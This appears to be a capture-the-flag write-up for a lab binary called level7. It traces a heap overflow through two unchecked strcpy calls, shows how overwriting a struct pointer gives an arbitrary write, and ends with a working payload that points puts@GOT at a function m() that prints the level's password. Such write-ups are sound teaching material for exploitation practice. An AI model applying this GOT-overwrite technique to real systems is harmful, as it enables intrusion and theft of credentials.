@@ -1,0 +1,455 @@
+First of all, I run the program and see how it behaves:
+
+```bash
+./level7 
+Segmentation fault (core dumped)
+./level7 AAAA
+Segmentation fault (core dumped)
+./level7 AAAA BBBB
+~~
+```
+
+Nothing special happens. The program prints a "~~" message and exits.
+
+At this point I know two things:
+
+* the program expects two arguments (properly).
+* user controlled data is probably processed somewhere.
+
+To understand what happens internally, I decide to inspect the assembly code:
+
+```bash
+echo 'disassemble main' | gdb -q ./level7
+```
+
+The first thing that catches my attention is the repeated calls to `malloc`:
+
+```asm
+movl   $0x8,(%esp)
+call   malloc
+```
+
+This appears four times.
+
+Since every allocation size is `8`, I start following how the returned pointers are used.
+
+After the first allocation:
+
+```asm
+call malloc
+mov %eax,0x1c(%esp)
+```
+
+the returned heap pointer is stored on the stack.
+
+A few instructions later:
+
+```asm
+mov 0x1c(%esp),%eax
+movl $0x1,(%eax)
+```
+
+The value `1` is written at offset `0`.
+
+Then:
+
+```asm
+mov %edx,0x4(%eax)
+```
+
+Something that looks like a pointer is written at offset `4`.
+
+At this point I can reconstruct the layout:
+
+```text
+offset 0 -> integer
+offset 4 -> pointer
+```
+
+which looks like:
+
+```c
+struct S
+{
+    int n;
+    char *buf;
+};
+```
+
+The size is:
+
+```text
+int     = 4 bytes
+pointer = 4 bytes
+-----------------
+total   = 8 bytes
+```
+
+which perfectly matches the `malloc(8)`.
+
+A little later I see exactly the same pattern again:
+
+```asm
+mov     $0x8,(%esp)
+call    0x80483f0 <malloc@plt>
+mov     %eax,0x18(%esp)
+mov     0x18(%esp),%eax
+movl    $0x2,(%eax)
+```
+
+so there are actually two structures:
+
+```c
+s1
+s2
+```
+
+each one containing an integer and a pointer.
+
+Then I continue reading the assembly and find two interesting calls:
+
+```asm
+call strcpy
+```
+
+and later another:
+
+```asm
+call strcpy
+```
+
+Then I continue reading the assembly and find the first call to `strcpy`.
+
+To understand what is copied, I follow the registers.
+
+First:
+
+    mov 0xc(%ebp),%eax
+
+loads `argv` into `%eax`.
+
+Then:
+
+    add $0x4,%eax
+    mov (%eax),%eax
+
+moves to `argv[1]` and dereferences it.
+
+Now:
+
+    eax = argv[1]
+
+The value is saved:
+
+    mov %eax,%edx
+
+so:
+
+    edx = argv[1]
+
+Next the program loads the first structure:
+
+    mov 0x1c(%esp),%eax
+
+Earlier, this location was used to store the pointer returned by the first `malloc(8)`.
+
+Therefore:
+
+    eax = s1
+
+Then:
+
+    mov 0x4(%eax),%eax
+
+reads the field at offset 4.
+
+So:
+
+    eax = s1->buf
+
+Current state:
+
+    eax = s1->buf
+    edx = argv[1]
+
+The compiler is now preparing the arguments for `strcpy`.
+
+    mov %edx,0x4(%esp)
+    mov %eax,(%esp)
+
+Stack before the call:
+
+    esp+0 -> s1->buf
+    esp+4 -> argv[1]
+
+Finally:
+
+    call strcpy
+
+which is equivalent to:
+
+    strcpy(s1->buf, argv[1]);
+
+A few instructions later, exactly the same sequence appears again.
+
+The only difference is that this time the program loads:
+
+    argv[2]
+
+and
+
+    s2->buf
+
+before calling `strcpy`.
+
+Therefore the second call becomes:
+
+    strcpy(s2->buf, argv[2]);
+
+At this point I notice something important:
+
+    buf1 size = 8 bytes
+    buf2 size = 8 bytes
+
+but `strcpy()` performs no size checking.
+
+This means a long `argv[1]` can overflow `buf1` and corrupt adjacent heap data.
+
+and this: 
+```shell
+./level7 "AAAAAAAAAAAAAAAAAAAAAA" "BBBB"
+Segmentation fault (core dumped)
+```
+
+proof the buff2 oveflow with "AAAA" thats why program crash
+
+Now I become interested because `strcpy` performs no bounds checking.
+
+I go back to the allocations and notice that both buffers were allocated with:
+
+```asm
+movl $0x8,(%esp)
+call malloc
+```
+
+meaning:
+
+```text
+buffer size = 8 bytes
+```
+
+This immediately suggests a heap overflow.
+
+Now I want to know what can be overwritten.
+
+The allocations occur in this order:
+
+```text
+s1
+buf1
+s2
+buf2
+```
+
+I want to reach `s2->buf` because it is later used as the destination of a `strcpy`.
+
+Calculating the distance:
+
+```text
+buf1          8 bytes
+malloc header 8 bytes
+s2->n        4 bytes
+---------------------
+total        20 bytes
+```
+
+Therefore after 20 bytes I reach:
+
+```text
+s2->buf
+```
+
+This is very interesting because later the program executes:
+
+```c
+strcpy(s2->buf, argv[2]);
+```
+
+Normally this means:
+
+```c
+strcpy(buf2, argv[2]);
+```
+
+But if I overwrite `s2->buf`, then I control the destination of the second `strcpy`.
+
+In other words:
+
+```c
+strcpy(ANY_ADDRESS, argv[2]);
+```
+
+which is an arbitrary write.
+
+Now I need a useful target.
+
+Since the binary has:
+
+```text
+No RELRO
+```
+
+I immediately think about the GOT.
+
+I inspect it:
+
+```bash
+objdump -R level7
+```
+
+and find:
+
+```text
+08049928 R_386_JUMP_SLOT puts
+```
+
+The next question is:
+
+"Can I force the program to call puts after overwriting it?"
+
+Looking further into main:
+
+```asm
+call puts
+```
+
+appears near the end of execution.
+
+Perfect.
+
+Now I need a useful function to redirect execution to.
+
+I inspect all functions:
+
+```bash
+objdump -d level7
+```
+
+and find:
+
+```text
+080484f4 <m>
+```
+
+This function looks suspicious.
+
+Inside it I see:
+
+```asm
+call printf
+```
+
+and references to:
+
+```text
+0x8049960
+```
+
+I search where that address is used.
+
+Back in main I find:
+
+```asm
+call fopen
+call fgets
+```
+
+and:
+
+```asm
+movl $0x8049960,(%esp)
+call fgets
+```
+
+which means:
+
+```c
+fgets(0x8049960, ...);
+```
+
+The program reads data from `.pass` into address:
+
+```text
+0x8049960
+```
+
+Then `m()` later prints data from the same location.
+
+At this point the exploit becomes obvious.
+
+Step 1:
+
+Overwrite `s2->buf` with:
+
+```text
+puts@GOT
+```
+
+using the first argument.
+
+Step 2:
+
+Use the second `strcpy` to overwrite:
+
+```text
+puts@GOT
+```
+
+with:
+
+```text
+m()
+```
+
+address.
+
+The payload becomes:
+
+```bash
+./level7 \
+$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
+$(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+Execution flow:
+
+```text
+argv[1]
+    |
+    v
+overflow buf1
+    |
+    v
+overwrite s2->buf
+    |
+    v
+s2->buf = puts@GOT
+    |
+    v
+argv[2]
+    |
+    v
+overwrite puts@GOT
+    |
+    v
+puts@GOT = m
+    |
+    v
+program calls puts()
+    |
+    v
+execution jumps to m()
+    |
+    v
+m() prints the password
+```
